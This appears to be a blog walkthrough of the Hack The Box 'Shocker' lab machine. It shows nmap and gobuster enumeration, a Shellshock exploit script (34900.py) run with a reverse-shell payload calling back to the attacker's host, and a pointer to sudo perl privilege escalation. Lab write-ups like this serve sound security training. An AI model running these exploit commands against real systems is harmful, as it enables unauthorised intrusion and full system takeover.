
<!DOCTYPE html>
<html>
   <head>
      <meta charSet="utf-8"/>
      <meta http-equiv="x-ua-compatible" content="ie=edge"/>
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
	  <link rel="shortcut icon" type="image/x-icon" href="/assets/images/favicon.ico" />
      <style data-href="/styles.7dd3e9346247d5425248.css">.search-module--search-bar--6m8v4{max-width:300px}.search-module--search-bar--6m8v4>input{background:hsla(0,0%,100%,.72);padding:10px;border-radius:12px;border:0}.search-module--search-bar--6m8v4>ul{position:absolute;max-width:300px;max-height:640px;overflow:auto;background:#f6f6f6;margin:0}.search-module--search-bar--6m8v4>ul li{color:#000;width:100%;display:inline-block;margin:0;padding:12px 16px;line-height:24px;border:2px solid rgba(0,102,51,.2)}.search-module--search-bar--6m8v4>ul li:hover{background:#fff}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}[hidden],template{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:inherit;font-weight:bolder}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,optgroup,select,textarea{font:inherit;margin:0}optgroup{font-weight:700}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{font:112.5%/1.45em georgia,sans-serif;box-sizing:border-box;overflow-y:scroll}*,:after,:before{box-sizing:inherit}body{color:rgba(0,0,0,.8);font-family:georgia,sans-serif;font-weight:400;word-wrap:break-word;-webkit-font-kerning:normal;font-kerning:normal;-ms-font-feature-settings:"kern","liga","clig","calt";font-feature-settings:"kern","liga","clig","calt"}img{max-width:100%;margin:0;padding:0}h1{font-size:2.25rem}h1,h2{padding:0;margin:0 0 1.45rem;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1}h2{font-size:1.62671rem}h3{font-size:1.38316rem}h3,h4{padding:0;margin:0 0 1.45rem;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1}h4{font-size:1rem}h5{font-size:.85028rem}h5,h6{padding:0;margin:0 0 1.45rem;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1}h6{font-size:.78405rem}hgroup{padding:0;margin:0 0 1.45rem}ol,ul{padding:0;margin:0 0 1.45rem 1.45rem;list-style-position:outside;list-style-image:none}dd,dl,figure,p{padding:0;margin:0 0 1.45rem}pre{margin:0 0 1.45rem;font-size:.85rem;line-height:1.42;background:rgba(0,0,0,.04);border-radius:3px;overflow:auto;word-wrap:normal;padding:1.45rem}table{font-size:1rem;line-height:1.45rem;border-collapse:collapse;width:100%}fieldset,table{padding:0;margin:0 0 1.45rem}blockquote{padding:0;margin:0 1.45rem 1.45rem}form,iframe,noscript{padding:0;margin:0 0 1.45rem}hr{padding:0;margin:0 0 calc(1.45rem - 1px);background:rgba(0,0,0,.2);border:none;height:1px}address{padding:0;margin:0 0 1.45rem}b,dt,strong,th{font-weight:700}li{margin-bottom:.725rem}ol li,ul li{padding-left:0}li>ol,li>ul{margin-left:1.45rem;margin-bottom:.725rem;margin-top:.725rem}blockquote :last-child,li :last-child,p :last-child{margin-bottom:0}li>p{margin-bottom:.725rem}code,kbd,samp{font-size:.85rem;line-height:1.45rem}abbr,abbr[title],acronym{border-bottom:1px dotted rgba(0,0,0,.5);cursor:help}abbr[title]{text-decoration:none}td,th,thead{text-align:left}td,th{border-bottom:1px solid rgba(0,0,0,.12);font-feature-settings:"tnum";-moz-font-feature-settings:"tnum";-ms-font-feature-settings:"tnum";-webkit-font-feature-settings:"tnum";padding:.725rem .96667rem calc(.725rem - 1px)}td:first-child,th:first-child{padding-left:0}td:last-child,th:last-child{padding-right:0}code,tt{background-color:rgba(0,0,0,.04);border-radius:3px;font-family:SFMono-Regular,Consolas,Roboto Mono,Droid Sans Mono,Liberation Mono,Menlo,Courier,monospace;padding:.2em 0}pre code{background:none;line-height:1.42}code:after,code:before,tt:after,tt:before{letter-spacing:-.2em;content:" "}pre code:after,pre code:before,pre tt:after,pre tt:before{content:""}@media only screen and (max-width:480px){html{font-size:100%}}footer{padding:96px 0;background:#0f0f0f;bottom:0;text-align:center;position:relative}footer,footer a{color:#999}footer a:focus,footer a:hover{color:#fff}footer .footer-module--social--QNE_v{margin:18px 0 30px;padding:0;font-size:30px}footer .footer-module--social--QNE_v li{display:inline-block;font-size:30px;padding:0;margin:0 0 0 42px;color:#f06000}footer .footer-module--social--QNE_v li:first-child{margin-left:0}@media only screen and (max-width:480px){footer .footer-module--social--QNE_v{font-size:20px}footer .footer-module--social--QNE_v li{margin-left:14px}}footer .footer-module--copyright--1-FxK{margin:0;padding:0}footer .footer-module--copyright--1-FxK li{display:inline-block;margin:0;padding:0;line-height:24px}.footer-module--ie--21UzZ footer .footer-module--copyright--1-FxK li{display:inline}footer .footer-module--copyright--1-FxK li:before{content:"\2022";padding-left:10px;padding-right:10px;color:#095153}footer .footer-module--copyright--1-FxK li:first-child:before{display:none}.footer-module--gotop--35bFg{position:absolute;top:-24px;left:50%;margin-left:-30px}.footer-module--gotop--35bFg a{text-decoration:none;border:0;display:block;width:48px;height:48px;background-color:#0f9095;-webkit-transition:all .2s ease-in-out;transition:all .2s ease-in-out;color:#fff;font-size:21px;line-height:50px;border-radius:100%;box-shadow:0 0 12px rgba(0,0,0,.2)}.footer-module--gotop--35bFg a:hover{background-color:#6f9}@media only screen and (max-width:767px){.footer-module--gotop--35bFg{margin-left:-22px}.footer-module--gotop--35bFg a{width:54px;height:54px;font-size:18px;line-height:54px}}.index-module--textBanner--YjZ-8{background:rgba(0,0,0,.6);border-radius:8px;border:1px solid rgba(0,96,0,.72)}.index-module--textBanner--YjZ-8 a{color:inherit}.team-module--social--1kmzU a{font-size:1.4rem;color:#6e6e6e}.writeups-module--card--2nKXd>p{margin:0;font-size:.75em;color:#efefef}.writeups-module--card--2nKXd>p:first-child{font-weight:700;color:#fff;font-size:1em}</style>
      <meta name="generator" content="Gatsby 2.18.17"/>
      <link rel="manifest" href="/manifest.webmanifest"/>
      <meta name="theme-color" content="#663399"/>
      <link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0d10bd57137015161c2cfffb390d059"/>
      <link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/>
      <link as="script" rel="preload" href="/webpack-runtime-2d51d0099acd9d66f9d7.js"/>
      <link as="script" rel="preload" href="/app-edafdb8a87528133144b.js"/>
      <link as="script" rel="preload" href="/styles-33e987324329888a5c26.js"/>
      <link as="script" rel="preload" href="/commons-4d3d2db350e8cd5683e5.js"/>
      <link as="script" rel="preload" href="/component---src-templates-writeup-js-7c0407b776346122acce.js"/>
   </head>
   <body>
      <div id="___gatsby">
      <div style="outline:none" tabindex="-1" role="group" id="gatsby-focus-wrapper">
      <div class="headroom-wrapper">
         <div style="position:relative;top:0;left:0;right:0;z-index:100;-webkit-transform:translate3D(0, 0, 0);-ms-transform:translate3D(0, 0, 0);transform:translate3D(0, 0, 0);background:#000000;padding-top:7.5px;margin-bottom:1.rem;height:80px;" class="headroom headroom--unfixed">
            <div size="500" class="sc-htpNat fphlTp">
               <div style="margin:0 auto;max-width:960px" class="css-zkfaav">
				  <a href="/hackthebox.html"><img height="70" alt="wicked" src="/assets/images/WICKED.png" style="display:inline"/></a>
                  <div class="css-1ntkiwo"></div>
               </div>
         </div>
      </div>
      <div style="margin:0 auto;max-width:960px;padding-top:24px">
<h1>Hack The Box: Shocker walkthrough</h1>
<h3>IP Address: 10.10.10.56</h3>

<p>NMAP scanning:</p>
<pre><code>
nmap -p- --min-rate=1000 10.10.10.56 -T4<br>
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1<br>
</code></pre>

<pre><code>
nmap -p80,2222 -sC -A -Pn- 10.10.10.56<br>
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>HTTP is open and SSH is running on port 22. I will enumerate HTTP, by visiting the website first.</p>
<img src="/assets/images/htb/shocker/shocker_1.jpg"><br>
<p>It is an empty webpage with an image it seems. I will run a directory scanner against the website and we will notice a cgi-bin/ directory, which opens up possibility of shellshock vulnerability.</p>
<pre><code>
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56/ -x php,html,txt<br>
<b>/cgi-bin/ (Status: 403)</b>
/cgi-bin/.html (Status: 403)
/index.html (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
</code></pre>
<p> Run a second directory scanner against the cgi-bin/ directory, but with additional extension - .sh</p>
<pre><code>
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56/cgi-bin/ -x php,html,txt,sh<br>
<b>/user.sh (Status: 200)</b>
</code></pre>
<p>Use searchsploit to find an exploit script that we can use to shellshock.</p>
<img src="/assets/images/htb/shocker/shocker_2.jpg"><br>
<p>Note to reader: there will be an error when running the script. Windows and Linux have different break line interpretations - to fix, simply change the format from DOS to Unix with '<b>dos2unix 34900.py</b>' and run the script.</p>
<pre><code>
./34900.py payload=reverse rhost=10.10.10.56 lhost=<LHOST IP> lport=<LPORT> pages=/cgi-bin/user.sh
</code></pre>
<img src="/assets/images/htb/shocker/shocker_3.jpg"><br>
<p>As the user shelly, it looks like perl is allowed to use with sudo. Additionally, it seems like Perl can be used to privilege escalate, <a href="https://gtfobins.github.io/gtfobins/perl/">GTFOBins</a> verifies this.</p>
<img src="/assets/images/htb/shocker/shocker_4.jpg"><br>
<p>And we are root!</p>
